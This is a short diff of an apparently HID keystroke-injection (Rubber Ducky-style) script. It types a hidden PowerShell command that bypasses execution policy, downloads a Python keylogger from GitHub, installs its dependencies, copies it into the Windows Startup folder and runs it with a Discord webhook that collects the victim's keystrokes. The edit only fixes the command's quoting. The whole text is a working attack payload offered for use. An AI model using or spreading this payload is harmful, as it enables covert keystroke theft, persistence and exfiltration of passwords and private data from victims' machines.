@@ -11,6 +11,6 @@ TAB
 DELAY 200
 ENTER
 DELAY 1700
-STRING powershell -w h -NoP -NonI -Exec Bypass -c "cd $env:USERPROFILE\Documents ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile $Env:USERPROFILE\Documents\logger.py ; py -m pip install discordwebhook pynput ; cp "$Env:USERPROFILE\Documents\logger.py" "$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" ; Python logger.py <Your discord webhook here>"
+STRING powershell -w h -NoP -NonI -Exec Bypass -c "cd $env:USERPROFILE\Documents ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile $Env:USERPROFILE\Documents\logger.py ; py -m pip install discordwebhook pynput ; cp '$Env:USERPROFILE\Documents\logger.py' '$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' ; Python logger.py <Your discord webhook here>"
 DELAY 200
 ENTER
